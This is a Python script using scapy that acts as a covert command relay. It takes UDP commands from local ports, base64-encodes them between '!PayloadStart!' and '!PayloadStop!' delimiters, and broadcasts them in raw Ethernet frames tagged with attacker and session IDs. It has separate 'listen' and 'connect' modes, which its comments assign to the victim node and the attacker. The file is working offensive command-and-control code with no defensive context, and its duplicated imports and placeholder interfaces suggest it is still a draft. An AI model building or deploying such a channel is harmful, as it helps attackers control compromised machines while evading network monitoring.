import threading
import time
import signal
from scapy.all import sniff, send
from scapy.all import get_if_list, get_if_addr
from scapy.all import UDP, IP

import threading
import time
import base64
import signal
from scapy.all import sniff, send, Ether, sendp
from scapy.all import get_if_list, get_if_addr
from scapy.all import UDP, IP

# Interfaces will need to be selected
lo_int  = "\\Device\\NPF_Loopback"
tmp_int = "\\Device\\NPF_{...}"
interfaces = ["\\Device\\NPF_Loopback","\\Device\\NPF_{...}"] # This cannot be hardcoded, pass the interface
                                                                                               # Change!
# A flag to indicate when to stop sniffing
sniffing_running = True

# Signal handler to catch Ctrl-C and set the flag to False
def signal_handler(signum, frame):
    global sniffing_running
    print("Ctrl-C pressed, exiting...")
    sniffing_running = False

# Set up the signal handler for Ctrl-C (SIGINT)
signal.signal(signal.SIGINT, signal_handler)

def Delimiter(payload):
    
    start_index = payload.find("!PayloadStart!")
    stop_index  = payload.find("!PayloadStop!")
    
    msg = payload[start_index + len("!PayloadStart!"):stop_index]
    return msg

# Function to run the sniffing process
def start_sniffing(attacker_id, session_id, mode, interfaces):
    def packet_handler(packet):
        #print("Packet captured:", packet.summary())

        # Now lets forward specific packets to loopback:2222
        if UDP in packet:
            src_port = packet[UDP].sport
            dst_port = packet[UDP].dport
            if src_port == 2223 and dst_port == 1111: # This condition is a cmd being sent
                print("aaa")
                packet[UDP].dport = 2223
                udp_payload = bytes(packet[UDP].payload)
                udp_payload = udp_payload.decode("utf-8")
                packet[IP].chksum = None
                packet[UDP].chksum = None
                packet = IP(src="127.0.0.1", dst="127.0.0.1") / UDP(sport=1111, dport=2222) / udp_payload # This structure will need to be sent
                #print("AAAAAAAAAAAAAAAAAA: ")
                #print(udp_payload)
                #send(packet)
                
                # Now, the frame needs to be constructed - For now this will be broadcasts
                delim1 = "!PayloadStart!"
                delim2 = "!PayloadStop!"
                attackerId = attacker_id  #Changethis
                sessionId  = session_id #Changethis
                payload = str(udp_payload).encode("utf-8")
                base64_payload = base64.b64encode(payload) # Bytes
                base64_string_payload = base64_payload.decode("utf-8") # String
                
                if mode == "listen": # The attacker id is omitted
                    frame_payload = str(sessionId + delim1 + base64_string_payload + delim2).encode("utf-8")
                    eth_frame = Ether(dst="FF:FF:FF:FF:FF:FF") / frame_payload
                    sendp(eth_frame, verbose=False)
                
                if mode == "connect": # If the attacker_id and session_id are both sent, it is for a node
                    frame_payload = str(attackerId + sessionId + delim1 + base64_string_payload + delim2).encode("utf-8")
                    eth_frame = Ether(dst="FF:FF:FF:FF:FF:FF") / frame_payload
                    sendp(eth_frame, verbose=False)  
        
        # if Ethernet frame - not implemented, checking for server response
        if Ether in packet:
            eth_frame = packet[Ether]
            if eth_frame.dst=="ff:ff:ff:ff:ff:ff": # This needs to be changed or kept default
            
                index    = str(eth_frame.payload.original).find(session_id)
                attacker_index = str(eth_frame.payload.original).find(attacker_id)
                try:
                    payload = str(eth_frame.payload.original.decode("utf-8"))
                except Exception as e:
                    print(e)
                    
                print("sess: " + str(index))
                print("att: " + str(attacker_index))
                #print("pay: " + str(eth_frame.payload.original.decode("utf-8")))
                if index != -1 and attacker_index == -1 and mode == "connect": # This is for the attacker
                    print("Source MAC:", eth_frame.src)
                    print("Destination MAC:", eth_frame.dst)
                    print("Payload Length:", len(eth_frame.payload))
                    # Take payload, create UDP packet and send to 2222
                    payload2 = Delimiter(payload)
                    #print(payload2)
                    payload_decoded = base64.b64decode(payload2)
                    payload_decoded = payload_decoded.decode("utf-8")
                    print(payload_decoded)
                    
                    packet = IP(src="127.0.0.1", dst="127.0.0.1") / UDP(sport=1111, dport=2223) / payload_decoded # This structure will need to be sent
                    packet[IP].chksum = None
                    packet[UDP].chksum = None
                    send(packet)
                
                if index != -1 and attacker_index != -1 and mode == "listen": # This is for the victim node
                    print("Source MAC:", eth_frame.src)
                    print("Destination MAC:", eth_frame.dst)
                    print("Payload Length:", len(eth_frame.payload))
                    # Take payload, create UDP packet and send to 2222
                    payload2 = Delimiter(payload)
                    #print(payload2)
                    payload_decoded = base64.b64decode(payload2)
                    payload_decoded = payload_decoded.decode("utf-8")
                    print(payload_decoded)
                    
                    packet = IP(src="127.0.0.1", dst="127.0.0.1") / UDP(sport=1111, dport=2223) / payload_decoded # This structure will need to be sent
                    packet[IP].chksum = None
                    packet[UDP].chksum = None
                    send(packet)
                
    # Sniff packets with a custom stop condition based on the flag
    while sniffing_running:
        #sniff(filter="udp and ((src port 1111 and dst port 9999) or (src port 9999 and dst port 1111))", prn=packet_handler, iface="\\Device\\NPF_Loopback")  # Timeout for checking flag
        #sniff(filter="(udp and ((src port 1111 and dst port 2222) or (src port 2222 and dst port 1111))) or (ether proto 0x0800)", prn=packet_handler, iface=interfaces)  # Timeout for checking flag
        sniff(prn=packet_handler, iface=interfaces)
        
# Start sniffing in a separate thread
def start_sniffing_args(attacker_id, session_id, mode, interfaces):
    inter = ["\\Device\\NPF_Loopback",interfaces] 
    sniffing_thread = threading.Thread(target=start_sniffing, args=(attacker_id, session_id, mode, inter))
    sniffing_thread.start()

    while sniffing_running:
        #print("Main thread doing other work...")
        time.sleep(1)

# Main thread can do other work or just wait for the sniffing to finish



#print("Sniffing stopped.")
